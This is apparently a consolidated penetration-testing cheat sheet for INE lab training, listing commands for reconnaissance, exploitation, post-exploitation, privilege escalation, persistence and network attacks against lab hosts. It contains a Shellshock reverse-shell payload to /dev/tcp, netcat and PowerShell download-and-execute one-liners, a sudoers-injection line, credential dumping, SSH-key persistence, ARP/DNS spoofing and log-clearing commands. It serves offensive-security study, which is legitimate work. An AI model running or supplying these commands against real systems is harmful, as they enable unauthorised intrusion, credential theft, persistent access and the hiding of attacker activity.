# INE — Cheat Sheet Consolidado (summary)



Índice (por tema)
1. Reconocimiento
2. Escaneo (Nmap)
3. Enumeración
4. Web / HTTP (WebDAV, Shellshock, HFS, BadBlue, Wmap)
5. SMB / Samba
6. FTP / vsftpd / TFTP
7. SSH
8. Metasploit (módulos, workspace, pivot)
9. Explotación y payloads (SearchSploit, HFS, ProcessMaker, vsftpd)
10. Post‑explotación Windows (WMIC, JAWS, WinRM, RDP)
11. Post‑explotación Linux (LinEnum, hashdump, histories)
12. Escalada de privilegios Unix/Linux (cron, chkrootkit, SUID, sudo)
13. Persistencia y pivoting (ssh keys, cron, autoroute, portfwd, SOCKS)
14. Fuerza bruta y cracking (Hydra, John, MSF auxiliaries)
15. Ataques de red y pcap (ARP/DNS MITM, SNMP, RSYNC, Wireshark)
16. Herramientas, wordlists y rutas útiles

Índice (por servicio)
- HTTP / Web / WebDAV / WordPress / HFS / BadBlue / Wmap  
- SMB / Samba / PSEXEC / SMB‑relay  
- FTP / vsftpd / TFTP  
- SSH / libssh / keys  
- MSSQL / MySQL / phpMyAdmin  
- RDP / WinRM  
- SNMP / SMTP / DNS / ARP / RSYNC / SOCKS

Cheat sheet (comandos y flujos encadenados)

1) Reconocimiento
- dnsenum
- dig
- sudo nmap -sn 192.168.x.0/24
- sudo netdiscover -r 192.168.0.0/24
- ping -c 1 <IP>
- Web probes:
  - curl -I http://host/robots.txt
  - curl -I http://target.ine.local/wp-config.php.bak
  - whatweb http://host
  - httrack http://host -O /tmp/site

2) Escaneo (Nmap)
- Básicos:
  - nmap -p- -sS -sV <target>
  - nmap -sn -PS21,22,25,80,445,3389 -T4 192.168.0.0/24
  - nmap -sU -sV -p1-250 <target>
- Scripts:
  - nmap demo.ine.local -p 134 -sUV --script=discovery
  - nmap -sV --script=banner demo.ine.local
  - nmap -sV --script=http-enum <host>
  - nmap -sV -p80 --script=http-shellshock --script-args uri=/gettime.cgi,cmd="CMD" <host>
  - nmap -p445 --script smb-enum-* --script-args smbusername=administrator,smbpassword=smbserver_771 <host>
- Firewall / evasión:
  - nmap -f --data-length 200 -D <decoy_ip> <host>

3) Enumeración
- Metasploit / workspace / nmap xml:
  - service postgresql start ; /etc/init.d/postgresql start
  - nmap -Pn demo.ine.local -oX <file-xml>.xml
  - msfconsole
  - workspace -a <name> ; workspace <name>
  - db_import <file-xml>.xml ; db_nmap <targets>
  - setg RHOSTS <IP>
- SMB / NetBIOS:
  - smbclient -L //host/ -N
  - smbclient //host/share -U user%pass
  - smbclient //demo.ine.local/ADMIN$ -U administrator%smbserver_771
  - smbclient //target.ine.local/pubfiles -N
  - smbmap -H <host> -u <user> -p <pass>
  - enum4linux -a <host>
  - rpcclient <host> -N -U ""
  - nmblookup -A <host>
- HTTP aux modules (Metasploit):
  - auxiliary/scanner/http/apache_userdir_enum
  - auxiliary/scanner/http/brute_dirs
  - auxiliary/scanner/http/dir_scanner
  - auxiliary/scanner/http/dir_listing
  - auxiliary/scanner/http/http_put
  - auxiliary/scanner/http/files_dir
  - auxiliary/scanner/http/http_login (example: bob:123321)
  - auxiliary/scanner/http/http_header
  - auxiliary/scanner/http/http_version
  - auxiliary/scanner/http/robots_txt
- MySQL aux modules:
  - auxiliary/scanner/mysql/mysql_version
  - auxiliary/scanner/mysql/mysql_login
  - auxiliary/admin/mysql/mysql_enum
  - auxiliary/scanner/mysql/mysql_hashdump
  - auxiliary/scanner/mysql/mysql_schemadump
  - auxiliary/scanner/mysql/mysql_writable_dirs (set DIR_LIST ...)
- SMTP enumeration:
  - telnet demo.ine.local 25
  - nc demo.ine.local 25
  - HELO attacker.xyz ; EHLO attacker.xyz ; VRFY <user>
  - smtp-user-enum -U <list> -t demo.ine.local
  - sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "msg" -o tls=no

4) Web / HTTP (WebDAV, Shellshock, HFS, BadBlue, Wmap)
- Recon & directory:
  - gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt
  - nikto -h demo.ine.local
- WebDAV:
  - davtest -url http://10.10.0.50/webdav/ -auth admin:password123
  - cadaver http://demo.ine.local/webdav/  ; put /usr/share/webshells/asp/webshell.asp
  - cadaver -> put /usr/share/webshells/php/php-reverse-shell.php
- Shellshock:
  - nmap -sV -p80 --script=http-shellshock --script-args uri=/gettime.cgi,cmd=ls demo.ine.local
  - Burp/User-Agent exploit example:
    - curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LHOST>/1234 0>&1" http://demo.ine.local/gettime.cgi
- HFS / manual exploit flow:
  - searchsploit hfs && cp 39161.py ./ && nano 39161.py (edit LHOST/LPORT) && python 39161.py <RHOST> <RPORT>
  - Terminal flows: cp nc.exe . && python -m SimpleHTTPServer 80 (serve nc) && nc -nvlp <LPort> && python 39161.py <RHOST> <RPORT>
- Wmap (Metasploit web scanner):
  - msfconsole -q ; load wmap
  - wmap_sites -a <ip> ; wmap_targets -t http://<ip>
  - wmap_run -t ; wmap_run -e
  - wmap_sites -l ; wmap_targets -l
- Nessus (install from file example):
  - chmod +x <nessus-deb-file> ; sudo dpkg -i <file>

5) SMB / Samba
- Scans:
  - nmap -p445 --script smb-enum-* <host>
  - nmap -sV <host> -p445 --script=smb-enum*
- Auth / retrieval:
  - smbclient //demo.ine.local/ADMIN$ -U administrator%smbserver_771
  - smbclient -L //192.231.27.3/ -N
- Metasploit:
  - scanner/smb/smb_version ; scanner/smb/smb_login (set RHOSTS; set PASS_FILE; run)
  - windows/smb/psexec (set RHOSTS; set SMBUSER; set SMBPASS; run)
  - exploit/linux/samba/is_known_pipename
- Relay & pivot:
  - use exploit/windows/smb/smb_relay ; set SRVHOST <IP> ; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST <IP> ; set SMBHOST <victim> ; exploit
  - echo "172.16.5.101 *.sportsfoo.com" > dns ; dnsspoof -i eth1 -f dns
  - echo 1 > /proc/sys/net/ipv4/ip_forward ; arpspoof -i eth1 -t <victim> <gw> ; arpspoof -i eth1 -t <gw> <victim>

6) FTP / vsftpd / TFTP
- FTP:
  - ftp <host>  (try anonymous) ; get flag.txt (interactive)
  - hydra -L users.txt -P passwords.txt ftp://<host>
- vsftpd backdoor:
  - use exploit/unix/ftp/vsftpd_234_backdoor (msf)
- TFTP (test undetermined UDP port):
  - tftp demo.ine.local 134

7) SSH
- Scanning / brute:
  - auxiliary/scanner/ssh/ssh_version
  - auxiliary/scanner/ssh/ssh_login
  - hydra -l user -P wordlist ssh://<host>
- libssh bypass:
  - use auxiliary/scanner/ssh/libssh_auth_bypass ; set RHOSTS <host> ; set SPAWN_PTY true ; run
- Use keys (CTF flow):
  - cp /root/.msf4/loot/..._id_rsa_*.txt ./ssh_key && chmod 0400 ssh_key && ssh -i ssh_key root@demo.ine.local
  - scp user@host:~/.ssh/id_rsa . && chmod 400 id_rsa && ssh -i id_rsa user@host

8) Metasploit — módulos, workspace y pivot
- Iniciar y preparar:
  - service postgresql start ; msfconsole
  - workspace -a <name> ; db_import <nmap.xml> ; db_nmap <targets>
- Módulos frecuentes:
  - scanner/mssql/mssql_login ; windows/mssql/mssql_payload
  - scanner/smb/smb_login ; windows/smb/psexec
  - exploit/linux/samba/is_known_pipename
  - auxiliary/scanner/ssh/libssh_auth_bypass
  - multi/handler (set LHOST; set LPORT; exploit)
  - post/linux/gather/* ; post/multi/gather/* ; post/linux/manage/sshkey_persistence
- Pivot / autoroute / portfwd (encadenado ejemplo):
  - sessions -i <id> && run autoroute -s 10.0.28.125/20 && portfwd add -l 1234 -p 80 -r <IP> && portfwd list
- Socks proxy:
  - server/socks_proxy SRVPORT=9050 ; proxychains nmap <target>

9) Explotación y payloads
- Banner grab:
  - nmap -sV --script banner demo.ine.local
  - nc 192.8.94.3 22
- HFS / manual exploit flow:
  - searchsploit hfs && cp 39161.py ./ && nano 39161.py && python 39161.py <RHOST> <RPORT>
  - prepare nc: cp /usr/share/windows-resources/binaries/nc.exe . && python -m SimpleHTTPServer 80 && nc -nvlp <LPort>
- ProcessMaker:
  - searchsploit ProcessMaker ; use multi/http/processmaker_exec
- vsftpd fallback:
  - if exploit/unix/ftp/vsftpd_234_backdoor fails: hydra -L users -P passwords demo.ine.local ftp ; ftp demo.ine.local 21
- PHP CGI arg injection:
  - use multi/http/php_cgi_arg_injection
- Netcat (bind/reverse):
  - nc -nvlp 1234
  - ./nc.exe -nv <KALI_IP> 1234 -e cmd.exe
  - nc -nv <target> <port>

10) Post‑explotación Windows
- Meterpreter:
  - sysinfo ; getuid ; getsystem ; hashdump ; load incognito ; clearev
  - load kiwi ; lsa_dump_sam (after migrations)
- Enumeration commands:
  - hostname ; systeminfo
  - wmic qfe get Caption,Description,HotFixID,InstalledOn
  - use post/windows/gather/win_privs ; use post/windows/gather/enum_logged_on_users ; use post/windows/gather/enum_applications ; use post/windows/gather/enum_patches
  - getuid ; getsystem ; ps ; migrate <pid> ; tasklist /SVC
- JAWS (example):
  - upload /root/Desktop/jaws-enum.ps1 ; powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt ; download JAWS-Enum.txt
- RDP / WinRM / remote tooling:
  - hydra rdp://demo.ine.local:3333 -L common_users.txt -P unix_passwords.txt -s 3333
  - xfreerdp /u:administrador /p:qwertyuiop /v:demo.ine.local:3333
  - crackmapexec winrm demo.ine.local -u administrator -p <password>
- Remote download & run:
  - certutil -urlcache -f http://<server>/file.exe file.exe
  - powershell -ExecutionPolicy Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<server>/script.ps1')"

11) Post‑explotación Linux
- Baseline:
  - hostname ; cat /etc/issue ; cat /etc/*release ; uname -a ; lscpu ; df -h
  - cat /etc/passwd ; ls /home ; who ; lastlog
  - ifconfig ; netstat -tunlp ; route ; cat /etc/hosts ; cat /etc/resolv.conf
  - ps aux ; top ; crontab -l ; ls -al /etc/cron*
- Automation:
  - upload LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh
- MSF post modules:
  - post/linux/gather/hashdump ; post/multi/gather/ssh_creds ; post/multi/gather/docker_creds ; post/linux/gather/phpmyadmin_credsteal ; post/linux/manage/sshkey_persistence
- History / cleanup:
  - history -c ; cat /dev/null > ~/.bash_history

12) Escalada de privilegios Unix/Linux
- Initial inspection:
  - ps aux ; crontab -l ; ls -al /etc/cron*
  - grep -nri "/tmp/message" /usr ; cat /usr/local/share/copy.sh
- Cron-copy scenario (CTF flow):
  - find / -name message
  - grep -nri "/tmp/message" /usr ; cat /usr/local/share/copy.sh
  - printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
  - sudo -l  ; sudo su
- chkrootkit case:
  - command -v chkrootkit && /bin/chkrootkit -V
  - if vulnerable (<= 0.5): use exploit/unix/local/chkrootkit ; set CHKROOTKIT /bin/chkrootkit ; set SESSION <id> ; set LHOST <ip> ; exploit ; cat /root/flag
- SUID / binary replacement scenario:
  - ls -l | grep 's' ; file welcome ; rm greetings ; cp /bin/bash greetings ; ./welcome  (example to obtain root shell)
- Sudo abuse:
  - sudo -l  ; if man = NOPASSWD then: sudo man ls -> then run !/bin/bash

13) Persistencia y pivoting
- SSH key persistence:
  - use post/linux/manage/sshkey_persistence ; set SESSION <id> ; set CREATESSHFOLDER true ; run
  - cp /root/.msf4/loot/..._id_rsa_*.txt ./ssh_key && chmod 0400 ssh_key && ssh -i ssh_key root@demo.ine.local
- Cron persistence:
  - echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron && crontab -i cron ; crontab -l
- Enable GUI / RDP:
  - run getgui -e -u alice -p hack_123321 ; xfreerdp /u:alice /p:hack_123321 /v:demo.ine.local
- Port forwarding / proxy (encadenado):
  - sessions -i <id> && portfwd add -l 1234 -p 80 -r <IP> && server/socks_proxy SRVPORT=9050

14) Fuerza bruta y cracking
- Hydra:
  - hydra -L users.txt -P passwords.txt ssh://host
  - hydra -L users.txt -P passwords.txt ftp://host
  - hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:Invalid username or password" -V
- John / MSF cracking:
  - use auxiliary/analyze/crack_windows ; set CUSTOM_WORDLIST <file> ; run
  - use auxiliary/analyze/crack_linux ; set SHA512 true ; run

15) Ataques de red y pcap
- ARP/DNS MITM (encadenado):
  - echo 1 > /proc/sys/net/ipv4/ip_forward && arpspoof -i eth1 -t <victim> <gw> && dnsspoof -i eth1 -f dnsfile
- SNMP:
  - nmap -sU -p161 --script snmp-* <host>
- RSYNC:
  - rsync rsync://target1.ine.local/ && rsync -av rsync://target1.ine.local/<module> ./localdir
- PCAP / Wireshark hints:
  - Wireshark filters: nbns ; http.user_agent  (identify DESKTOP-9PEA63H, domain 623start.site)

16) Herramientas, wordlists y rutas
- Herramientas citadas: nmap, msfconsole, smbclient, smbmap, enum4linux, rpcclient, nmblookup, netcat (nc), hydra, john, searchsploit, nikto, davtest, cadaver, gobuster, certutil, wget, netdiscover, wireshark/tcpdump, Nessus, proxychains, dnsspoof, arpspoof, crackmapexec.
- Wordlists / paths:
  - /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
  - /usr/share/metasploit-framework/data/wordlists/common_users.txt
  - /usr/share/wordlists/dirb/common.txt
  - /usr/share/webshells/
  - /root/.msf4/loot/

